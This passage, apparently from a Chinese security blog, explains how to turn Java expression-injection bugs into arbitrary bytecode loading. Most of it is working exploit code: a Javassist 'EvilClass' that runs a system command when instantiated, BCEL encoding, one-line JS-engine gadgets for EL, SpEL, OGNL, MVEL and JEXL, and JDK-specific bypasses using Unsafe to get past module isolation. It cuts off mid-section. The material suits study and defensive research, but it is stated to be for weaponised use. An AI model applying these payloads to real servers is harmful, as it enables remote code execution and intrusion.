<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建类 EvilClass</span></span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造器：一旦实例化，就会执行系统命令</span></span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">    constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置 class 文件版本，49 对应 Java 5，兼容性更好</span></span><br><span class="line">    ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回生成的字节码数组</span></span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>之后通过 <code>Utility.encode</code> 将类的字节码编码非 BCEL ClassLoader 能够识别的编码形式，该函数定义如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 将字节数组编码为 Java 标识符字符串，即一个仅包含以下字符的字符串：</span></span><br><span class="line"><span class="comment"> * (a, ... z, A, ... Z, 0, ... 9, _, $)。</span></span><br><span class="line"><span class="comment"> * 编码算法本身并不复杂：如果当前字节的 ASCII 值已经是一个有效的 Java 标识符部分，则保持不变。</span></span><br><span class="line"><span class="comment"> * 否则，它会写入转义字符 ($)，后跟：</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;ul&gt;&lt;li&gt;ASCII 值的十六进制字符串，如果该值不在 200 到 247 之间&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;一个未在小写十六进制字符串中使用的 Java 标识符字符，如果该值在 200 到 247 之间&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;此操作会使原始字节数组膨胀大约 40% 到 50%&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes 要转换的字节数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> compress 是否使用 GZIP 压缩以最小化字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(<span class="type">byte</span>[] bytes, <span class="type">boolean</span> compress)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span>(compress) &#123;</span><br><span class="line">        <span class="comment">// 使用 GZIP 压缩字节数组</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span>      <span class="variable">gos</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        gos.write(bytes, <span class="number">0</span>, bytes.length);  <span class="comment">// 将字节数组写入 GZIP 流</span></span><br><span class="line">        gos.close();  <span class="comment">// 关闭 GZIP 输出流</span></span><br><span class="line">        baos.close(); <span class="comment">// 关闭字节数组输出流</span></span><br><span class="line"></span><br><span class="line">        bytes = baos.toByteArray(); <span class="comment">// 获取压缩后的字节数组</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">CharArrayWriter</span> <span class="variable">caw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharArrayWriter</span>();  <span class="comment">// 用于存储字符输出</span></span><br><span class="line">    <span class="type">JavaWriter</span>      <span class="variable">jw</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWriter</span>(caw);   <span class="comment">// JavaWriter 用于将字节写入字符输出流</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">in</span> <span class="operator">=</span> bytes[i] &amp; <span class="number">0x000000ff</span>; <span class="comment">// 将字节转换为无符号值</span></span><br><span class="line">        jw.write(in);  <span class="comment">// 将字节值写入 JavaWriter</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> caw.toString();  <span class="comment">// 返回编码后的字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们首先需要将 Java 字节码进行 GZIP 压缩，之后借助 <code>JavaWriter</code> 将字节编码写入 <code>CharArrayWriter</code> 然后再转换成字符串输出。其中 <code>JavaWriter</code> 的 <code>write</code> 方法会对字符进行转义操作：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用作转义前缀的特殊字符；凡遇到不可直接写出的字节，先写一个 &#x27;$&#x27; 再写编码内容</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span> <span class="variable">ESCAPE_CHAR</span> <span class="operator">=</span> <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 情况 A：如果 b 转成的字符本身就是“合法的 Java 标识符组成部分”</span></span><br><span class="line">    <span class="comment">//（例如字母、数字、下划线等），且它本身不是转义前缀 &#x27;$&#x27;，那么可以原样输出。</span></span><br><span class="line">    <span class="comment">// 这样能最大程度保持可读性并缩短结果。</span></span><br><span class="line">    <span class="keyword">if</span> (isJavaIdentifierPart((<span class="type">char</span>) b) &amp;&amp; (b != ESCAPE_CHAR)) &#123;</span><br><span class="line">        out.write(b);  <span class="comment">// 直接写出该字符</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 情况 B：否则进入“转义模式”</span></span><br><span class="line">        <span class="comment">// 先输出转义前缀 &#x27;$&#x27;，表明接下来不是原字符，而是一个被编码后的表示</span></span><br><span class="line">        out.write(ESCAPE_CHAR);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// B-1：快速映射路径</span></span><br><span class="line">        <span class="comment">// 若 b 落在预留的“快速/特殊映射”区间 [0, FREE_CHARS) 内，</span></span><br><span class="line">        <span class="comment">// 则用 CHAR_MAP[b] 映射为“一个安全字符”写出。</span></span><br><span class="line">        <span class="comment">// 这样做的目的：对常见字节值用 1 个字符完成编码，节省长度。</span></span><br><span class="line">        <span class="keyword">if</span> (b &gt;= <span class="number">0</span> &amp;&amp; b &lt; FREE_CHARS) &#123;</span><br><span class="line">            out.write(CHAR_MAP[b]); <span class="comment">// 表驱动的 1 字符转义</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// B-2：通用转义路径（两位十六进制）</span></span><br><span class="line">            <span class="comment">// 对不在快速映射表内的字节，使用两位小写十六进制表示（高位在前）。</span></span><br><span class="line">            <span class="comment">// 注意这里确保总是恰好两位：若只有一位，则在前面补 &#x27;0&#x27;。</span></span><br><span class="line">            <span class="comment">// 这样可以在解码时按“每次读两位十六进制”的固定步长正确还原。</span></span><br><span class="line">            <span class="type">char</span>[] tmp = Integer.toHexString(b).toCharArray();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp.length == <span class="number">1</span>) &#123;      <span class="comment">// 例如十进制 5 -&gt; 十六进制 &quot;5&quot;</span></span><br><span class="line">                out.write(<span class="string">&#x27;0&#x27;</span>);          <span class="comment">// 补成 &quot;05&quot;</span></span><br><span class="line">                out.write(tmp[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;                     <span class="comment">// 正常两位（或更长，见下提示）</span></span><br><span class="line">                out.write(tmp[<span class="number">0</span>]);</span><br><span class="line">                out.write(tmp[<span class="number">1</span>]);       <span class="comment">// 仅写入前两位，保持统一长度为 2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后我们需要在编码后的字节码前面加上 <code>$$BCEL$$</code> 标识，这样 BCEL ClassLoader 就可以正确识别类的字节码并动态加载类。</p>
<h3 id="SPI（Service-Provider-Interface）"><a href="#SPI（Service-Provider-Interface）" class="headerlink" title="SPI（Service Provider Interface）"></a>SPI（Service Provider Interface）</h3><h2 id="JS-引擎加载字节码"><a href="#JS-引擎加载字节码" class="headerlink" title="JS 引擎加载字节码"></a>JS 引擎加载字节码</h2><p>Java 有很多种表达式，不同表达式有不同的语法特点：有些必须要 用链式反射去调用方法，有些可以直接 new；有些表达式只能执行一 句，有些可以执行多句。想要做到武器化利用就要选取一种通用的中间层语言，去延展我们的利用链。</p>
<p>从 <strong>Java 6</strong> 开始，Java 引入了 <strong>JSR-223（Scripting for the Java Platform）</strong> 规范。这个规范提供了 <code>javax.script</code> 包，允许 Java 程序在运行时调用和执行脚本语言。开发者可以用它加载不同的脚本引擎，例如 JavaScript、Groovy、Python（Jython）等，从而在 Java 应用中实现动态逻辑。</p>
<p>我们可以通过下面这段代码测试当前环境支持那些脚本引擎：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">       List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();</span><br><span class="line">       <span class="keyword">for</span> (ScriptEngineFactory factory: factories)&#123;</span><br><span class="line">               System.out.printf(</span><br><span class="line">                   <span class="string">&quot;Name: %s%n&quot;</span> + <span class="string">&quot;Version: %s%n&quot;</span> + <span class="string">&quot;Language name: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Language version: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Extensions: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Mime types: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Names: %s%n&quot;</span>,</span><br><span class="line">                   factory.getEngineName(),</span><br><span class="line">                   factory.getEngineVersion(),</span><br><span class="line">                   factory.getLanguageName(),</span><br><span class="line">                   factory.getLanguageVersion(),</span><br><span class="line">                   factory.getExtensions(),</span><br><span class="line">                   factory.getMimeTypes(),</span><br><span class="line">                   factory.getNames()</span><br><span class="line">               );</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在这些脚本引擎中， JS 引擎非常符合我们的要求：</p>
<ul>
<li><p>一行代码即可调用 JS 引擎，在 JS 引擎中可以执行多句。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EL:</span></span><br><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SpEL:</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ognl:</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">javax</span>.script.ScriptEngineManager()).getEngineByName(<span class="string">&quot;js&quot;</span>).eval()</span><br><span class="line"></span><br><span class="line"><span class="comment">// MVEL:</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="string">&quot;js&quot;</span>).eval();</span><br><span class="line"></span><br><span class="line"><span class="comment">// JEXL:</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval()</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>JDK6-14 都可以使用，基本满足对兼容性的需要。</p>
</li>
<li><p>可以间接调用 Java 方法，实现任意代码执行。</p>
</li>
</ul>
<p>由于 JS 引擎的限制，很多比如注入内存马、加载 Shellcode 等相关操作在 JS 引擎中实现较为麻烦，涉及到  Java 跟 JS 类型之间的转换，容易有 BUG，无法直接复用原有的很多基于字节码的 Payload。为了实现任意代码执行的完全体，还是需要做到<strong>任意字节码的加载</strong>。</p>
<h3 id="JDK8-任意字节码加载"><a href="#JDK8-任意字节码加载" class="headerlink" title="JDK8 任意字节码加载"></a>JDK8 任意字节码加载</h3><p>Java 的 JS 引擎可以调用 Java 本身的 API，因此我们可以通过 JS 引擎执行一段 JS 代码来反射调用 <code>defineClass</code> 方法来动态加载字节码。</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> classBytes = <span class="title class_">Base64DecodeToByte</span>(<span class="title class_">Classdata</span>);</span><br><span class="line"><span class="keyword">var</span> byteArray = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&quot;byte[]&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> int = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&quot;int&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> defineClassMethod = java.<span class="property">lang</span>.<span class="property">ClassLoader</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(</span><br><span class="line">    <span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">    byteArray.<span class="property">class</span>,</span><br><span class="line">    int.<span class="property">class</span>,</span><br><span class="line">    int.<span class="property">class</span></span><br><span class="line">);</span><br><span class="line">defineClassMethod.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">var</span> cc = defineClassMethod.<span class="title function_">invoke</span>(</span><br><span class="line">    <span class="title class_">Thread</span>.<span class="title function_">currentThread</span>().<span class="title function_">getContextClassLoader</span>(),</span><br><span class="line">    classBytes,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    classBytes.<span class="property">length</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> cc.<span class="title function_">getConstructor</span>(java.<span class="property">lang</span>.<span class="property">String</span>.<span class="property">class</span>).<span class="title function_">newInstance</span>(cmd);</span><br></pre></td></tr></table></figure></div>

<p>然后借助 <code>ScriptEngineManager</code> 执行这段 JS 代码实现任意字节码加载：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">    constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">    ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getJsPayload</span><span class="params">(String code)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;var data = &#x27;&quot;</span> + code + <span class="string">&quot;&#x27;;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var bytes = java.util.Base64.getDecoder().decode(data);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var int = Java.type(\&quot;int\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\&quot;defineClass\&quot;, bytes.class, int.class, int.class);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;defineClassMethod.setAccessible(true);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var cc = defineClassMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;cc.getConstructor().newInstance();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">    manager.getEngineByName(<span class="string">&quot;js&quot;</span>).eval(getJsPayload(Base64.getEncoder().encodeToString(getEvilClass(<span class="string">&quot;calc&quot;</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="JDK6-7-Rhino下调用defineClass"><a href="#JDK6-7-Rhino下调用defineClass" class="headerlink" title="JDK6&#x2F;7 Rhino下调用defineClass"></a>JDK6&#x2F;7 Rhino下调用defineClass</h3><p>JDK6&#x2F;7 开始引入 JS 引擎，采用 Rhino 实现，不支持 <code>Java.type</code> 等方便的接口获取 Java 类型的操作，因此上述 Payload 在反射调用 <code>ClassLoader.defineClass</code> 会有玄学报错。</p>
<p>解决方法是使用 <code>Unsafe</code> 类下的 <code>defineClass</code> 绕过， <code>BCELClassLoader</code> 也可以，不过 Payload 跟后续的不通用。</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> classBytes = <span class="title class_">Base64DecodeToByte</span>(<span class="title class_">Classdata</span>);</span><br><span class="line"><span class="keyword">var</span> unsafeField = java.<span class="property">lang</span>.<span class="property">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.Unsafe&quot;</span>).<span class="title function_">getDeclaredField</span>(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">unsafeField.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">unsafe = unsafeField.<span class="title function_">get</span>(<span class="literal">null</span>);</span><br><span class="line">clz = unsafe.<span class="title function_">defineClass</span>(</span><br><span class="line">    <span class="literal">null</span>,</span><br><span class="line">    classBytes,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    classBytes.<span class="property">length</span>,</span><br><span class="line">    <span class="literal">null</span>,</span><br><span class="line">    <span class="literal">null</span></span><br><span class="line">);</span><br><span class="line">clz.<span class="title function_">newInstance</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="JDK9-10-11-绕过模块隔离强行反射方法"><a href="#JDK9-10-11-绕过模块隔离强行反射方法" class="headerlink" title="JDK9&#x2F;10&#x2F;11 绕过模块隔离强行反射方法"></a>JDK9&#x2F;10&#x2F;11 绕过模块隔离强行反射方法</h3><p>JDK11移除了 <code>Unsafe.defineClass</code> 方法，因此上述代码会出现如下报错：</p>
<blockquote>
<p>TypeError: unsafe.defineClass is not a function in  at line number 27</p>
</blockquote>
<p>而 JDK9 引入了的模块化系统，因为 <code>java.base</code> 模块并没有开放 <code>java.lang</code> 包给 <code>jdk.scripting.nashorn.scripts</code> 模块因此如果使用 <code>defineClass</code> 加载字节码则会遇到无法强行对 <code>defineClass</code> 方法 <code>setAccessible(true)</code>。</p>
<blockquote>
<p>Unable to make protected final java.lang.Class  java.lang.ClassLoader.defineClass(byte[],int,int) throws java.lang.ClassFormatError accessible:  module java.base does not “opens java.lang” to module jdk.scripting.nashorn.scripts</p>
</blockquote>
<p><code> java.lang.reflect.AccessibleObject#checkCanSet</code> 的 Accessible 会通过 <code>Modifier</code> 判断权限修饰符，通过 <code>Unsafe</code> 类强行将其变为 <code>public</code> 方法可以绕过上述问题。</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Unsafe</span> = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> field = <span class="title class_">Unsafe</span>.<span class="property">class</span>.<span class="title function_">getDeclaredField</span>(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">field.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">var</span> unsafe = field.<span class="title function_">get</span>(<span class="literal">null</span>); <span class="comment">// 获取 unsafe 实例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> byteArray = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&quot;byte[]&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> int = <span class="title class_">Java</span>.<span class="title function_">type</span>(<span class="string">&quot;int&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> defineClassMethod = java.<span class="property">lang</span>.<span class="property">ClassLoader</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(</span><br><span class="line">    <span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">    byteArray.<span class="property">class</span>,</span><br><span class="line">    int.<span class="property">class</span>,</span><br><span class="line">    int.<span class="property">class</span></span><br><span class="line">); <span class="comment">// 获取 defineClass 方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> modifiers = defineClassMethod.<span class="title function_">getClass</span>().<span class="title function_">getDeclaredField</span>(<span class="string">&quot;modifiers&quot;</span>); <span class="comment">// 获取 defineClass 的 modifiers 字段</span></span><br><span class="line"></span><br><span class="line">unsafe.<span class="title function_">putShort</span>(</span><br><span class="line">    defineClassMethod,</span><br><span class="line">    unsafe.<span class="title function_">objectFieldOffset</span>(modifiers),</span><br><span class="line">    <span class="title class_">Modifier</span>.<span class="property">PUBLIC</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cc = defineClassMethod.<span class="title function_">invoke</span>(</span><br><span class="line">    java.<span class="property">lang</span>.<span class="property">Thread</span>.<span class="title function_">currentThread</span>().<span class="title function_">getContextClassLoader</span>(),</span><br><span class="line">    classBytes,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    classBytes.<span class="property">length</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">cc.<span class="title function_">newInstance</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="JDK12-13-14绕过fieldFilterMap"><a href="#JDK12-13-14绕过fieldFilterMap" class="headerlink" title="JDK12&#x2F;13&#x2F;14绕过fieldFilterMap"></a>JDK12&#x2F;13&#x2F;14绕过fieldFilterMap</h3><p>JDK&gt;&#x3D;12 报错提示：没有 <code>modifiers</code> 字段</p>
<blockquote>
<p>Caused by: java.lang.NoSuchFieldException: modifiers at java.base&#x2F;java.lang.Class.getDeclaredField(Class.java:2416)</p>
